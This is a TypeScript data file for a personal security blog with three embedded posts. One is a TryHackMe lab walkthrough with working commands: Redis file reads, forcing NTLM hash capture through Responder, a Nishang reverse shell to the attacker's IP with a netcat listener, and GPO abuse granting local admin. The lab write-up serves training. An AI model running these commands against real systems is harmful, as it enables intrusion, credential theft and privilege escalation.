export type BlogPost = {
  id: string
  title: string
  excerpt: string
  content: string
  coverImage?: string
  date: string
  readingTime: string
  tags: string[]
  slug: string
}

// This function will fetch blog posts
export const getBlogPosts = async (): Promise<BlogPost[]> => {
  return [
    {
      id: "1",
      title: "Understanding Active Directory Attack Vectors",
      excerpt:
        "An in-depth analysis of common attack vectors in Active Directory environments and how to mitigate them.",
      content: `
# Understanding Active Directory Attack Vectors

Active Directory (AD) is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services.

## Common Attack Vectors

### 1. Kerberoasting

Kerberoasting is an attack technique that allows an attacker to crack service account passwords offline. The attack works by requesting a service ticket for a service account and then attempting to crack the ticket offline.

### 2. Pass-the-Hash

Pass-the-Hash (PtH) is an attack technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM or LM hash of a user's password, instead of requiring the actual password.

### 3. Golden Ticket Attacks

A Golden Ticket attack is a type of attack in which an attacker gains access to the Kerberos Key Distribution Center (KDC) and steals the krbtgt account password hash. With this hash, the attacker can create a Golden Ticket, which is a forged Kerberos Ticket Granting Ticket (TGT).

## Mitigation Strategies

1. Implement the principle of least privilege
2. Use strong, complex passwords
3. Enable multi-factor authentication
4. Monitor for suspicious activity
5. Keep systems updated with the latest security patches
      `,
      date: "2023-12-15",
      readingTime: "8 min read",
      tags: ["Security", "Active Directory", "Penetration Testing"],
      slug: "understanding-active-directory-attack-vectors",
    },
    {
      id: "2",
      title: "Vulnet Active TryHackMe",
      excerpt:
        "A walkthrough of the Vulnet Active room on TryHackMe, focusing on Active Directory exploitation techniques.",
      content: `
**Enumeration**

This room on tryhackme is all about active directory and domain controller. So let's begin our machine with Nmap scanning.

![Initial Enumeration](/images/enum.jpg)

Every domain controller services are up and running which is part of AD DC. But \`Kerberos\` is not running so we can not <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast" class="text-emerald-400 hover:underline" target="_blank" rel="noopener noreferrer">AS-REP</a> roasting the usernames to check if they are valid.

I ran the Nmap to scan all ports.

![All Ports Scan](/images/nmap_all.jpg)

Here many ports are open so it is always beneficial to check for all ports. RPC and LDAP services are also running, Smb is a very good option to start with and I did the same.

**SMB port 445 enumeration**

But unfortunately, we got access denied for every possible command of \`smbclient, smbmap, and netexec\` to enumerate users' share on smb port 445.
It confirms that no guest and a null session are allowed.

**Redis exploitation**

But my eyes got on to port 6379 (Redis). I was unaware of this but <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis" class="text-emerald-400 hover:underline" target="_blank" rel="noopener noreferrer">hacktricks</a> are always a good option to search for anything.
Redis is a No-sql database that stores information alongside key-value called keyspaces. The version of Redis key-value store 2.8.2402 is vulnerable to ssrf + CRLF.

![Redis Exploitation](/images/redis.jpg)

Here we can exploit Redis via ssrf, but we must know the path to the windows server files

\`\`\`
redis-cli -h 10.10.245.19 eval "dofile('C:\\\\\\Users\\\\\\enterprise-security\\\\\\Desktop\\\\\\users.txt')" 0
\`\`\`

![Redis Command Execution](/images/redis_exp.jpg)

we got the users.txt flag. If we can get any files why not exploit further to get Authenticated user's NTLM hash? If we forge redis to connect back to our attacking machine, maybe users' hashes will be exposed.

I set up the responder from impacket, when users from the Redis server try to connect to our machine responder will log the hashes.

\`\`\`
sudo responder -I 10.9.0.31
\`\`\`

\`\`\`
redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0
\`\`\`

![Responder Hash Capture](/images/responder.jpg)

Since we got the user enterprise-security hash, we cracked with john the ripper and got the password.

**SMB port 445 enumerations 2nd round**

We have now a username and password, so we can enumerate allowed shares on smbserver. I tried to log into enterprise-Share on smb and successfully logged in.

\`\`\`
smbmap -H 10.10.155.156 -u enterprise-security -p pass
\`\`\`

![SMB Enumeration](/images/smbmap.jpg)

\`\`\`
smbclient //10.10.155.156/enterprise-share -U 'enterprise-security' pass
\`\`\`

![SMB Client Access](/images/smbclient.jpg)

There is a Powershell script scheduled to run, PurgeIrrelevantData_1826.ps1 with content.

\`\`\`
rm -Force C:\\Users\\Public\\Documents\\* -ErrorAction SilentlyContinue
\`\`\`

Maybe we can replace this script with a reverse shell. We do have written permission for this share.

**Initial foothold**

We use <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" class="text-emerald-400 hover:underline" target="_blank" rel="noopener noreferrer">Nishang</a> reverse shell to replace PurgeIrrelevantData_1826.ps1 and put it on the smb server overriding the same file and setting up Netcat listener to catch the shell.

Add this line to the bottom of the script and wait for netcat to catch the shell.

\`\`\`
Invoke-PowerShellTcp -Reverse -IPAddress 10.9.0.31 -Port 4444
\`\`\`

\`\`\`
nc -lvnp 4444
\`\`\`

![Reverse Shell Connection](/images/shell.jpg)

Finally, we got reverse shell as enterprise security for the windows server.

**Privilege Escalation**

When I get the foothold on the machine, I always start with winPEAS.exe and it does give me some useful information which is SeImpersonatePrivilege.

I collect domain info with bloodhound-python and upload it to the bloodhound for analyzing users, groups, and domains.

![BloodHound Analysis](/images/bloodhound.jpg)

Here is the shortest path to the admin where we will be abusing one of the \`GPO(group policy object)\` on which we can edit users' permission, local groups, memberships, and computer tasks.

We use \`SharpGPOAbuse.exe\` to escalate our privilege.

\`\`\`
./SharpGPOAbuse.exe AddComputerTask TaskName "babbadeckl_privesc" Author vulnnet\\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"
\`\`\`

\`\`\`
gpupdate /force
\`\`\`

We can access admin via smbclient.

\`\`\`
smbclient //10.10.56.175/C$ -U 'enterprise-security' sand_………...
\`\`\`
      `,
      date: "2024-03-10",
      readingTime: "10 min read",
      tags: ["TryHackMe", "Active Directory", "Penetration Testing", "Walkthrough"],
      slug: "vulnet-active-tryhackme",
    },
    {
      id: "3",
      title: "Web Application Security Best Practices",
      excerpt:
        "Essential security practices every developer should implement to protect web applications from common vulnerabilities.",
      content: `
# Web Application Security Best Practices

Web application security is a critical aspect of web development. Here are some best practices to keep your web applications secure.

![Security Best Practices](/placeholder.svg?height=400&width=800&text=Web+Security+Best+Practices)

## Input Validation

Always validate input on both the client and server side. Never trust user input.

## Authentication and Authorization

Implement strong authentication mechanisms and proper authorization checks.

## HTTPS Everywhere

Use HTTPS for all communications to encrypt data in transit.

## Content Security Policy

Implement Content Security Policy (CSP) to prevent XSS attacks.

## Regular Security Audits

Conduct regular security audits and penetration testing to identify and fix vulnerabilities.
      `,
      date: "2024-01-20",
      readingTime: "6 min read",
      tags: ["Web Security", "OWASP", "Best Practices"],
      slug: "web-application-security-best-practices",
    },
  ]
}

export const getBlogPostBySlug = async (slug: string): Promise<BlogPost | undefined> => {
  const posts = await getBlogPosts()
  return posts.find((post) => post.slug === slug)
}
